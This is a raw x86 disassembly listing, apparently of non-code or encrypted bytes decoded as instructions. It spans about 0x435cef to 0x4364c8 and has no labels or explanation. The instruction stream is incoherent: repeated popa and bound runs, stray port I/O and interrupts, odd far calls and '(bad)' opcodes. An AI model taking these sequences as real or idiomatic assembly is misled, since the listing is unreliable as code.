  435cef:	out    dx,al
  435cf0:	pop    edi
  435cf1:	scas   eax,DWORD PTR es:[edi]
  435cf2:	sbb    al,0x57
  435cf4:	and    dh,bh
  435cf6:	popa   
  435cf7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435cf8:	or     eax,0xdc9c964
  435cfd:	jne    0x435c85
  435cff:	pop    ss
  435d00:	jne    0x435d57
  435d02:	or     eax,0x481f9275
  435d07:	xor    al,0xd
  435d09:	int    0x55
  435d0b:	or     eax,0x61680417
  435d10:	popa   
  435d11:	adc    esi,edi
  435d13:	cdq    
  435d14:	pop    ss
  435d15:	jne    0x435d80
  435d17:	or     eax,0xf2939a75
  435d1c:	popa   
  435d1d:	popf   
  435d1e:	xor    al,0xcc
  435d20:	popa   
  435d21:	popa   
  435d22:	out    0x38,eax
  435d24:	or     eax,0xf2939a75
  435d29:	popa   
  435d2a:	test   DWORD PTR [edx],ecx
  435d2c:	sbb    ah,BYTE PTR [ecx+0x61]
  435d2f:	xor    al,0xb9
  435d31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435d32:	popa   
  435d33:	popa   
  435d34:	or     eax,0x179469cd
  435d39:	push   0xa269750d
  435d3e:	mov    ds:0xd697517,al
  435d43:	jne    0x435cdf
  435d45:	mov    ds:0x9a7517a2,al
  435d4a:	out    dx,al
  435d4b:	dec    ebp
  435d4c:	scas   eax,DWORD PTR es:[edi]
  435d4d:	sbb    al,0xd
  435d4f:	int    0x69
  435d51:	xchg   esp,eax
  435d52:	pop    ss
  435d53:	push   0x1f92750d
  435d58:	dec    eax
  435d59:	xor    al,0xd
  435d5b:	int    0x55
  435d5d:	or     eax,0x61680417
  435d62:	popa   
  435d63:	adc    esi,edi
  435d65:	cdq    
  435d66:	push   edi
  435d67:	and    al,BYTE PTR [esi+0x640da561]
  435d6d:	leave  
  435d6e:	leave  
  435d6f:	or     eax,0x75178675
  435d74:	push   ebp
  435d75:	or     eax,0x481f9275
  435d7a:	xor    al,0xd
  435d7c:	int    0x55
  435d7e:	or     eax,0x61680417
  435d83:	popa   
  435d84:	adc    esi,edi
  435d86:	cdq    
  435d87:	pop    ss
  435d88:	jne    0x435df3
  435d8a:	or     eax,0x1e939a75
  435d8f:	popa   
  435d90:	fsubr  DWORD PTR [ecx-0x20]
  435d93:	out    0x7f,eax
  435d95:	or     eax,0x6939a75
  435d9a:	popa   
  435d9b:	test   eax,ebx
  435d9d:	popa   
  435d9e:	popa   
  435d9f:	popa   
  435da0:	fcomp  DWORD PTR [edx+ebx*4]
  435da3:	or     eax,0x680469cd
  435da8:	or     eax,0x17a26975
  435dad:	jne    0x435e18
  435daf:	or     eax,0x17a29a75
  435db4:	jne    0x435d50
  435db6:	out    dx,al
  435db7:	inc    esi
  435db8:	or     eax,0x61ff6975
  435dbd:	popa   
  435dbe:	or     eax,0x481f9275
  435dc3:	xor    al,0xd
  435dc5:	int    0x55
  435dc7:	or     eax,0x61680417
  435dcc:	popa   
  435dcd:	adc    esi,edi
  435dcf:	cdq    
  435dd0:	push   edi
  435dd1:	and    al,BYTE PTR [esi+0x640da561]
  435dd7:	fsub   DWORD PTR [esi+esi*2+0x21]
  435ddb:	jne    0x435e0e
  435ddd:	lods   eax,DWORD PTR ds:[esi]
  435dde:	loop   0x435de1
  435de0:	imul   esp,DWORD PTR [ecx],0xe2256475
  435de6:	add    DWORD PTR [ecx+0xd],ebp
  435de9:	jne    0x435d85
  435deb:	or     eax,0x69751761
  435df0:	and    DWORD PTR [ebp+0x55],esi
  435df3:	adc    al,0xe2
  435df5:	add    DWORD PTR [ecx+0x21],ebp
  435df8:	jne    0x435e57
  435dfa:	or     al,0x8a
  435dfc:	push   ecx
  435dfd:	icebp  
  435dfe:	or     eax,0xb856475
  435e03:	call   0xa8e8:0x5e343ac9
  435e0a:	popa   
  435e0b:	or     eax,0x6fd631cd
  435e10:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  435e16:	pop    esi
  435e17:	call   0xbad6bfc4
  435e1c:	pop    ds
  435e1d:	pop    ss
  435e1e:	jne    0x435e13
  435e20:	out    dx,al
  435e21:	imul   ecx,DWORD PTR ds:0xb856475,0xffffff9a
  435e28:	leave  
  435e29:	cmp    cl,BYTE PTR ds:0x6e13f3cd
  435e2f:	push   0x61a8e85e
  435e34:	pop    ss
  435e35:	jne    0x435e2a
  435e37:	or     eax,0xb855575
  435e3c:	call   0xa8e8:0x5e343ac9
  435e43:	popa   
  435e44:	or     eax,0x6fd664cd
  435e49:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  435e4f:	pop    esi
  435e50:	call   0x1f70bffd
  435e55:	mov    eax,ds:0xb493f375
  435e5a:	(bad)  [ecx+0x61]
  435e5d:	popa   
  435e5e:	or     eax,0xb856975
  435e63:	call   0xa8e8:0x5e343ac9
  435e6a:	popa   
  435e6b:	or     eax,0x6fd664cd
  435e70:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  435e76:	pop    esi
  435e77:	call   0x1fc2c024
  435e7c:	out    0x9e,eax
  435e7e:	or     eax,0xb856975
  435e83:	call   0xa8e8:0x5e343ac9
  435e8a:	popa   
  435e8b:	or     eax,0x6fd664cd
  435e90:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  435e96:	pop    esi
  435e97:	call   0xf388c044
  435e9c:	or     eax,0x6fd65dcd
  435ea1:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  435ea7:	pop    esi
  435ea8:	call   0x1ff2c055
  435ead:	pop    ss
  435eae:	jne    0x435ec8
  435eb0:	out    dx,al
  435eb1:	jns    0x435ec0
  435eb3:	jne    0x435f1e
  435eb5:	test   DWORD PTR [ebx],ecx
  435eb7:	call   0xa8e8:0x5e343ac9
  435ebe:	popa   
  435ebf:	or     eax,0x6fd664cd
  435ec4:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  435eca:	pop    esi
  435ecb:	call   0xf388c078
  435ed0:	pop    ss
  435ed1:	jne    0x435eeb
  435ed3:	or     eax,0x75171875
  435ed8:	imul   esi,eax,0x6262622c
  435ede:	or     eax,0xcd0d9a75
  435ee3:	imul   edx,DWORD PTR [edi],0x69750d9a
  435ee9:	push   edi
  435eea:	and    dh,bh
  435eec:	popa   
  435eed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435eee:	or     eax,0x7264d664
  435ef3:	mul    DWORD PTR [ecx+0x61]
  435ef6:	iret   
  435ef7:	and    edx,esp
  435ef9:	repz pop esi
  435efb:	bound  esp,QWORD PTR [edx-0x53]
  435efe:	loop   0x435f01
  435f00:	imul   esp,DWORD PTR [ecx],0x625e3ce2
  435f06:	bound  esp,QWORD PTR ds:0x216901e2
  435f0c:	jne    0x435f6b
  435f0e:	lods   eax,DWORD PTR ds:[esi]
  435f0f:	mov    ch,0x1
  435f11:	imul   esp,DWORD PTR [ecx],0x625e48e2
  435f17:	bound  ebp,QWORD PTR [edi]
  435f19:	loop   0x435f1c
  435f1b:	imul   ecx,DWORD PTR ds:0x625ef3e2,0x9a0b8562
  435f25:	leave  
  435f26:	cmp    dh,BYTE PTR [esi+ebx*2]
  435f29:	call   0x755ac0d6
  435f2e:	imul   esp,DWORD PTR [ecx],0xe2145575
  435f34:	add    DWORD PTR [ecx+0x21],ebp
  435f37:	loop   0x435f9d
  435f39:	pop    esi
  435f3a:	bound  esp,QWORD PTR [edx+0xc]
  435f3d:	mov    dl,BYTE PTR [ecx-0xf]
  435f40:	or     eax,0x3ce20d57
  435f45:	pop    esi
  435f46:	bound  esp,QWORD PTR [edx-0x7b]
  435f49:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  435f4f:	call   0x1350c0fc
  435f54:	repz pop esi
  435f56:	bound  esp,QWORD PTR [edx-0x2a]
  435f59:	outs   dx,DWORD PTR ds:[esi]
  435f5a:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  435f60:	pop    esi
  435f61:	call   0xbad6c10e
  435f66:	pop    ds
  435f67:	pop    ss
  435f68:	jne    0x435f9b
  435f6a:	out    dx,al
  435f6b:	mov    cl,BYTE PTR ds:0x625e3ce2
  435f71:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  435f77:	or     eax,0x6e1331cd
  435f7c:	push   0x61a8e85e
  435f81:	pop    ss
  435f82:	jne    0x435fb5
  435f84:	or     eax,0xcd0d3175
  435f89:	pop    ebp
  435f8a:	(bad)  
  435f8b:	outs   dx,DWORD PTR ds:[esi]
  435f8c:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  435f92:	pop    esi
  435f93:	call   0xe450c140
  435f98:	cmp    al,0x5e
  435f9a:	bound  esp,QWORD PTR [edx-0x2a]
  435f9d:	or     bx,WORD PTR [edx+0x22d63ac9]
  435fa4:	pop    esi
  435fa5:	call   0x4e70c152
  435faa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435fab:	pop    ds
  435fac:	les    ebp,FWORD PTR ds:0x3331750d
  435fb2:	pop    esi
  435fb3:	call   0xbc8c160
  435fb8:	call   0x1369:0x75173ac9
  435fbf:	jne    0x43602a
  435fc1:	shl    bl,cl
  435fc3:	lea    esp,[ebx+0x62]
  435fc6:	bound  edx,QWORD PTR [edi]
  435fc8:	jne    0x436033
  435fca:	or     eax,0xcd0d3175
  435fcf:	imul   edx,DWORD PTR [edi],0x5e31e210
  435fd5:	bound  esp,QWORD PTR [edx-0x12]
  435fd8:	add    eax,0x5e48e20d
  435fdd:	bound  esp,QWORD PTR [edx-0x7b]
  435fe0:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  435fe6:	call   0x755ac193
  435feb:	imul   esp,DWORD PTR [ecx],0x625e18e2
  435ff1:	bound  ebp,QWORD PTR [edi]
  435ff3:	mov    ch,0x1
  435ff5:	imul   ecx,DWORD PTR ds:0x86750d3d,0x5ef3130d
  435fff:	bound  esp,QWORD PTR [edx-0x2a]
  436002:	outs   dx,DWORD PTR ds:[esi]
  436003:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  436009:	pop    esi
  43600a:	call   0x1feac1b7
  43600f:	xchg   ebx,eax
  436010:	outs   dx,BYTE PTR ds:[esi]
  436011:	out    dx,eax
  436012:	popa   
  436013:	popa   
  436014:	popa   
  436015:	or     eax,0x6fd655cd
  43601a:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  436020:	pop    esi
  436021:	call   0x7550c1ce
  436026:	imul   eax,DWORD PTR [ebp-0xd],0x5e50e217
  43602d:	bound  esp,QWORD PTR [edx+0xd]
  436030:	jne    0x435fcc
  436032:	sbb    ah,BYTE PTR [ecx+0x4]
  436035:	loop   0x436088
  436037:	pop    esi
  436038:	bound  esp,QWORD PTR [edx-0x6d]
  43603b:	push   es
  43603c:	loop   0x43608f
  43603e:	pop    esi
  43603f:	bound  esp,QWORD PTR [edx+0xd]
  436042:	int    0x69
  436044:	scas   eax,DWORD PTR es:[edi]
  436045:	pusha  
  436046:	pop    ss
  436047:	adc    ebx,DWORD PTR [eax+0x5e]
  43604a:	bound  esp,QWORD PTR [edx+0xd]
  43604d:	loop   0x436067
  43604f:	pop    esi
  436050:	bound  esp,QWORD PTR [edx-0x7b]
  436053:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  436059:	call   0x1350c206
  43605e:	pop    eax
  43605f:	pop    esi
  436060:	bound  esp,QWORD PTR [edx+0x7f]
  436063:	pusha  
  436064:	or     eax,0x5e31136e
  436069:	bound  esp,QWORD PTR [edx+0xd]
  43606c:	adc    edx,DWORD PTR [eax+0x5e]
  43606f:	bound  esp,QWORD PTR [edx-0x51]
  436072:	pop    ds
  436073:	pop    ss
  436074:	jne    0x4360df
  436076:	or     eax,0x625e3ce2
  43607b:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  436081:	or     eax,0x6e139acd
  436086:	push   0x61a8e85e
  43608b:	pop    ss
  43608c:	jne    0x436028
  43608e:	or     eax,0x625e3ce2
  436093:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  436099:	xor    al,0x5e
  43609b:	call   0xcd50c248
  4360a0:	xchg   BYTE PTR ds:0x86cd1760,ch
  4360a6:	lock int 0x62
  4360a9:	bound  esp,QWORD PTR [edx+0xd]
  4360ac:	loop   0x4360f6
  4360ae:	pop    esi
  4360af:	bound  esp,QWORD PTR [edx-0x7b]
  4360b2:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  4360b8:	call   0xcd50c265
  4360bd:	imul   ebp,DWORD PTR [edi+0x2257c71f],0xda5619a
  4360c7:	fs (bad) 
  4360c9:	fs pop ebp
  4360cb:	popa   
  4360cc:	popa   
  4360cd:	popa   
  4360ce:	push   DWORD PTR [ebp+0x1c]
  4360d1:	sub    bh,bh
  4360d3:	jne    0x4360f4
  4360d5:	daa    
  4360d6:	push   DWORD PTR [ebp+0x22]
  4360d9:	adc    al,0xff
  4360db:	jne    0x4360f2
  4360dd:	sub    edi,edi
  4360df:	jne    0x4360da
  4360e1:	push   ds
  4360e2:	push   DWORD PTR [ebp-0xc]
  4360e5:	and    edi,edi
  4360e7:	jne    0x4360e8
  4360e9:	and    bh,bh
  4360eb:	jne    0x43610e
  4360ed:	adc    eax,0x226075ff
  4360f2:	push   DWORD PTR [ebp+0x57]
  4360f5:	pop    ds
  4360f6:	push   DWORD PTR [ebp+0x4e]
  4360f9:	sbb    al,0xff
  4360fb:	jne    0x43614a
  4360fd:	and    edi,edi
  4360ff:	jne    0x43614d
  436101:	(bad)  
  436102:	push   DWORD PTR [ebp+0x53]
  436105:	hlt    
  436106:	push   DWORD PTR [ebp+0x52]
  436109:	stc    
  43610a:	push   DWORD PTR [ebp+0x59]
  43610d:	dec    ebp
  43610e:	push   DWORD PTR [ebp+0x58]
  436111:	dec    esi
  436112:	push   DWORD PTR [ebp+0x4f]
  436115:	push   edi
  436116:	push   DWORD PTR [ebp+0x46]
  436119:	pusha  
  43611a:	push   DWORD PTR [ebp+0x45]
  43611d:	pop    ecx
  43611e:	push   DWORD PTR [ebp+0x28]
  436121:	push   edx
  436122:	push   DWORD PTR [ebp+0x2b]
  436125:	push   ebx
  436126:	push   DWORD PTR [ebp+0x26]
  436129:	dec    esp
  43612a:	push   DWORD PTR [ebp+0x51]
  43612d:	inc    ebp
  43612e:	push   DWORD PTR [ebp+0x50]
  436131:	inc    esi
  436132:	push   DWORD PTR [ebp+0x47]
  436135:	dec    edi
  436136:	push   DWORD PTR [ebp+0x3e]
  436139:	push   DWORD PTR ds:[ebp+0x3d]
  43613d:	inc    edi
  43613e:	push   DWORD PTR [ebp+0x3c]
  436141:	push   eax
  436142:	push   DWORD PTR [ebp+0x43]
  436145:	dec    ecx
  436146:	push   DWORD PTR [ebp+0x42]
  436149:	inc    edx
  43614a:	push   DWORD PTR [ebp+0x49]
  43614d:	inc    ebx
  43614e:	push   DWORD PTR [ebp+0x48]
  436151:	cmp    al,0xff
  436153:	jne    0x436194
  436155:	xor    eax,0x363675ff
  43615a:	push   DWORD PTR [ebp+0x35]
  43615d:	aas    
  43615e:	push   DWORD PTR [ebp+0x18]
  436161:	dec    eax
  436162:	push   DWORD PTR [ebp+0x1b]
  436165:	ret    0x75ff
  436168:	push   ss
  436169:	push   ss
  43616a:	push   DWORD PTR [ebp-0x3e]
  43616d:	sbb    edi,edi
  43616f:	jne    0x436164
  436171:	sbb    bh,bh
  436173:	jne    0x436165
  436175:	out    dx,al
  436176:	push   DWORD PTR [ebp-0xf]
  436179:	icebp  
  43617a:	push   DWORD PTR [ebp-0x12]
  43617d:	lock push DWORD PTR [ebp+0x64]
  436181:	repz push DWORD PTR [ebp-0x14]
  436185:	cli    
  436186:	push   DWORD PTR [ebp-0x13]
  436189:	in     eax,dx
  43618a:	push   DWORD PTR [ebp-0x6]
  43618d:	in     al,dx
  43618e:	push   DWORD PTR [ebp+0x31]
  436191:	push   DWORD PTR fs:[ebp+0x6f]
  436195:	push   DWORD PTR gs:[ebp+0x66]
  436199:	push   WORD PTR [ebp+0x65]
  43619d:	outs   dx,DWORD PTR ds:[esi]
  43619e:	push   DWORD PTR [ebp+0x5d]
  4361a1:	scas   al,BYTE PTR es:[edi]
  4361a2:	push   DWORD PTR [ebp+0x44]
  4361a5:	mov    ebx,0xb04b75ff
  4361aa:	push   DWORD PTR [ebp+0x4a]
  4361ad:	and    al,0xff
  4361af:	jne    0x43621a
  4361b1:	mov    edx,0xb73075ff
  4361b6:	push   DWORD PTR [ebp+0x67]
  4361b9:	lods   al,BYTE PTR ds:[esi]
  4361ba:	push   DWORD PTR [ebp+0x5e]
  4361bd:	mov    cl,0xff
  4361bf:	jne    0x436216
  4361c1:	and    eax,0xb35c75ff
  4361c6:	push   DWORD PTR [ebp+0x63]
  4361c9:	std    
  4361ca:	push   DWORD PTR [ebp+0x62]
  4361cd:	push   esp
  4361ce:	fcomp  DWORD PTR [ebx-0x6a]
  4361d1:	bound  esp,QWORD PTR [edx+0x62]
  4361d4:	popa   
  4361d5:	out    dx,al
  4361d6:	lea    ecx,ds:0x626296e2
  4361dc:	bound  esp,QWORD PTR [edx+0x6296e217]
  4361e2:	bound  esp,QWORD PTR [edx-0x28]
  4361e5:	and    edx,DWORD PTR [esi-0x5d9d9d9e]
  4361eb:	jae    0x436226
  4361ed:	or     eax,0x626296e2
  4361f2:	bound  edx,QWORD PTR [ebx+0x1c342c06]
  4361f8:	test   eax,ebx
  4361fa:	popa   
  4361fb:	popa   
  4361fc:	popa   
  4361fd:	fcomp  DWORD PTR [edx+ebx*4]
  436200:	add    al,0xe2
  436202:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436203:	bound  esp,QWORD PTR [edx+0x62]
  436206:	xchg   ebx,eax
  436207:	push   es
  436208:	loop   0x4361b1
  43620a:	bound  esp,QWORD PTR [edx+0x62]
  43620d:	sbb    dl,BYTE PTR [ebx]
  43620f:	xchg   esi,eax
  436210:	bound  esp,QWORD PTR [edx+0x62]
  436213:	add    al,0x10
  436215:	xor    al,0xa2
  436217:	bound  esp,QWORD PTR [edx+0x62]
  43621a:	out    dx,al
  43621b:	sbb    eax,0x62725bd8
  436220:	bound  esp,QWORD PTR [edx+0x61]
  436223:	fcomp  DWORD PTR [ebx-0x62]
  436226:	bound  esp,QWORD PTR [edx+0x62]
  436229:	popa   
  43622a:	or     eax,0x626272e2
  43622f:	bound  esp,QWORD PTR [edi-0x276c798b]
  436235:	ficomp DWORD PTR [edi+0x61]
  436238:	popa   
  436239:	or     eax,0xe2569a75
  43623e:	jb     0x4362a2
  436240:	bound  esp,QWORD PTR [edx-0x6d]
  436243:	push   es
  436244:	popa   
  436245:	fsubr  DWORD PTR [ecx-0x63]
  436248:	mov    dl,0x7c
  43624a:	or     eax,0x626272e2
  43624f:	(bad)  
  436250:	fmul   DWORD PTR [eax+0x61]
  436253:	pop    ss
  436254:	loop   0x4361e0
  436256:	bound  esp,QWORD PTR [edx+0x62]
  436259:	or     eax,0x626272e2
  43625e:	bound  esp,QWORD PTR [edx+0x6272e217]
  436264:	bound  esp,QWORD PTR [edx-0x12]
  436267:	add    cl,BYTE PTR ds:0xe2569a75
  43626d:	jb     0x4362d1
  43626f:	bound  esp,QWORD PTR [edx-0x6d]
  436272:	push   es
  436273:	popa   
  436274:	xchg   ebx,eax
  436275:	push   es
  436276:	outs   dx,BYTE PTR ds:[esi]
  436277:	xor    al,0xa2
  436279:	bound  esp,QWORD PTR [edx+0x62]
  43627c:	pop    ss
  43627d:	loop   0x436209
  43627f:	bound  esp,QWORD PTR [edx+0x62]
  436282:	or     eax,0x626272e2
  436287:	bound  esp,QWORD PTR [edx+0x6272e217]
  43628d:	bound  esp,QWORD PTR [edx+0xd]
  436290:	loop   0x43621c
  436292:	bound  esp,QWORD PTR [edx+0x62]
  436295:	pop    ss
  436296:	loop   0x43630e
  436298:	bound  esp,QWORD PTR [edx+0x62]
  43629b:	or     eax,0xe2569a75
  4362a0:	jb     0x436304
  4362a2:	bound  esp,QWORD PTR [edx-0x6d]
  4362a5:	push   es
  4362a6:	popa   
  4362a7:	fsubr  DWORD PTR [ecx-0x63]
  4362aa:	mov    dl,0x7c
  4362ac:	or     eax,0x626272e2
  4362b1:	(bad)  
  4362b2:	fmul   DWORD PTR [eax+0x61]
  4362b5:	pop    ss
  4362b6:	loop   0x436336
  4362b8:	bound  esp,QWORD PTR [edx+0x62]
  4362bb:	or     eax,0x626272e2
  4362c0:	bound  esp,QWORD PTR [edx+0x6272e217]
  4362c6:	bound  esp,QWORD PTR [edx-0x12]
  4362c9:	add    cl,BYTE PTR ds:0xe2569a75
  4362cf:	jb     0x436333
  4362d1:	bound  esp,QWORD PTR [edx-0x6d]
  4362d4:	push   es
  4362d5:	popa   
  4362d6:	xchg   ebx,eax
  4362d7:	push   es
  4362d8:	outs   dx,BYTE PTR ds:[esi]
  4362d9:	xor    al,0xa2
  4362db:	bound  esp,QWORD PTR [edx+0x62]
  4362de:	pop    ss
  4362df:	loop   0x43635f
  4362e1:	bound  esp,QWORD PTR [edx+0x62]
  4362e4:	or     eax,0x626272e2
  4362e9:	bound  esp,QWORD PTR [edx+0x6272e217]
  4362ef:	bound  esp,QWORD PTR [edx+0xd]
  4362f2:	loop   0x436372
  4362f4:	bound  esp,QWORD PTR [edx+0x62]
  4362f7:	pop    ss
  4362f8:	loop   0x4362f5
  4362fa:	bound  esp,QWORD PTR [edx+0x62]
  4362fd:	or     eax,0xe2569a75
  436302:	jb     0x436366
  436304:	bound  esp,QWORD PTR [edx-0x6d]
  436307:	push   es
  436308:	popa   
  436309:	fsubr  DWORD PTR [ecx-0x63]
  43630c:	mov    dl,0x7c
  43630e:	or     eax,0x626272e2
  436313:	(bad)  
  436314:	fmul   DWORD PTR [eax+0x61]
  436317:	pop    ss
  436318:	loop   0x4362ac
  43631a:	bound  esp,QWORD PTR [edx+0x62]
  43631d:	or     eax,0x626272e2
  436322:	bound  esp,QWORD PTR [edx+0x6272e217]
  436328:	bound  esp,QWORD PTR [edx-0x12]
  43632b:	add    cl,BYTE PTR ds:0xe2569a75
  436331:	jb     0x436395
  436333:	bound  esp,QWORD PTR [edx-0x6d]
  436336:	push   es
  436337:	popa   
  436338:	xchg   ebx,eax
  436339:	push   es
  43633a:	outs   dx,BYTE PTR ds:[esi]
  43633b:	xor    al,0xa2
  43633d:	bound  esp,QWORD PTR [edx+0x62]
  436340:	pop    ss
  436341:	loop   0x4362d5
  436343:	bound  esp,QWORD PTR [edx+0x62]
  436346:	or     eax,0x626272e2
  43634b:	bound  esp,QWORD PTR [edx+0x6272e217]
  436351:	bound  esp,QWORD PTR [edx+0xd]
  436354:	loop   0x4362e8
  436356:	bound  esp,QWORD PTR [edx+0x62]
  436359:	pop    ss
  43635a:	loop   0x4362ea
  43635c:	bound  esp,QWORD PTR [edx+0x62]
  43635f:	or     eax,0xe2569a75
  436364:	jb     0x4363c8
  436366:	bound  esp,QWORD PTR [edx-0x6d]
  436369:	push   es
  43636a:	popa   
  43636b:	fsubr  DWORD PTR [ecx-0x63]
  43636e:	mov    dl,0x7c
  436370:	or     eax,0x626272e2
  436375:	(bad)  
  436376:	fmul   DWORD PTR [eax+0x61]
  436379:	pop    ss
  43637a:	loop   0x436302
  43637c:	bound  esp,QWORD PTR [edx+0x62]
  43637f:	or     eax,0x626272e2
  436384:	bound  esp,QWORD PTR [edx+0x6272e217]
  43638a:	bound  esp,QWORD PTR [edx-0x12]
  43638d:	add    cl,BYTE PTR ds:0xe2569a75
  436393:	jb     0x4363f7
  436395:	bound  esp,QWORD PTR [edx-0x6d]
  436398:	push   es
  436399:	popa   
  43639a:	xchg   ebx,eax
  43639b:	push   es
  43639c:	outs   dx,BYTE PTR ds:[esi]
  43639d:	xor    al,0xa2
  43639f:	bound  esp,QWORD PTR [edx+0x62]
  4363a2:	pop    ss
  4363a3:	loop   0x43632b
  4363a5:	bound  esp,QWORD PTR [edx+0x62]
  4363a8:	or     eax,0x626272e2
  4363ad:	bound  esp,QWORD PTR [edx+0x6272e217]
  4363b3:	bound  esp,QWORD PTR [edx+0xd]
  4363b6:	loop   0x43633e
  4363b8:	bound  esp,QWORD PTR [edx+0x62]
  4363bb:	pop    ss
  4363bc:	loop   0x436364
  4363be:	bound  esp,QWORD PTR [edx+0x62]
  4363c1:	or     eax,0x626276e2
  4363c6:	bound  ebx,QWORD PTR [edi]
  4363c8:	dec    eax
  4363c9:	mov    BYTE PTR ds:0x6262fb13,cl
  4363cf:	bound  ebx,QWORD PTR [edi]
  4363d1:	aas    
  4363d2:	xchg   BYTE PTR [esi+0x1f],dl
  4363d5:	or     eax,0x62628e13
  4363da:	bound  ebx,QWORD PTR [edi]
  4363dc:	aas    
  4363dd:	cmp    edx,DWORD PTR [esi-0x1e]
  4363e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4363e1:	bound  esp,QWORD PTR [edx+0x62]
  4363e4:	push   esi
  4363e5:	pusha  
  4363e6:	pop    ss
  4363e7:	adc    edi,DWORD PTR [eax]
  4363e9:	bound  esp,QWORD PTR [edx+0x62]
  4363ec:	or     eax,0x62629ee2
  4363f1:	bound  esp,QWORD PTR [edi-0x2b8c818b]
  4363f7:	or     eax,0x626238e2
  4363fc:	bound  ebx,QWORD PTR [edi]
  4363fe:	repz xchg edx,eax
  436400:	aad    0x62
  436402:	popa   
  436403:	popa   
  436404:	popa   
  436405:	or     eax,0x135692cd
  43640a:	sahf   
  43640b:	bound  esp,QWORD PTR [edx+0x62]
  43640e:	add    al,0x68
  436410:	or     eax,0x62629ee2
  436415:	bound  esp,QWORD PTR [edx+0x629ee217]
  43641b:	bound  esp,QWORD PTR [edx+0xd]
  43641e:	loop   0x4363be
  436420:	bound  esp,QWORD PTR [edx+0x62]
  436423:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436424:	jne    0x4364a4
  436426:	jae    0x4363fc
  436428:	or     eax,0x626238e2
  43642d:	bound  ebx,QWORD PTR [edi]
  43642f:	repz call 0xd61:0x616162d5
  436437:	int    0x92
  436439:	push   esi
  43643a:	adc    ebx,DWORD PTR [esi+0x4626262]
  436440:	push   0x629ee20d
  436445:	bound  esp,QWORD PTR [edx-0x5e]
  436448:	pop    ss
  436449:	loop   0x4363e9
  43644b:	bound  esp,QWORD PTR [edx+0x62]
  43644e:	or     eax,0x62629ee2
  436453:	bound  esp,QWORD PTR [edi+0x7f737e75]
  436459:	or     eax,0x626238e2
  43645e:	(bad)  
  43645f:	aad    0x62
  436461:	popa   
  436462:	popa   
  436463:	popa   
  436464:	or     eax,0x135692cd
  436469:	sahf   
  43646a:	bound  esp,QWORD PTR [edx+0x62]
  43646d:	add    al,0x68
  43646f:	or     eax,0x62629ee2
  436474:	bound  esp,QWORD PTR [edx+0x629ee217]
  43647a:	bound  esp,QWORD PTR [edx-0x10]
  43647d:	mov    al,0x5c
  43647f:	bound  esp,QWORD PTR [edx+0x57]
  436482:	and    dl,BYTE PTR [edx+0x640da561]
  436488:	leave  
  436489:	fcom   DWORD PTR [ebp+0x750d6155]
  43648f:	call   0xa206:0x93867556
  436496:	(bad)  
  436497:	fsubr  DWORD PTR [ecx-0x63]
  43649a:	mov    dl,0x3a
  43649c:	or     eax,0x17a25575
  4364a1:	jne    0x4364f8
  4364a3:	or     eax,0x75569a75
  4364a8:	xchg   BYTE PTR [ebx-0x279c5dfa],dl
  4364ae:	imul   ebx,DWORD PTR [ebp+0x750d3ab2],0x7517a255
  4364b8:	push   ebp
  4364b9:	or     eax,0xf31f8675
  4364be:	pop    edi
  4364bf:	jnp    0x4364dd
  4364c1:	push   esi
  4364c2:	sub    eax,0x22575575
  4364c7:	.byte 0x9a
  4364c8:	popa   
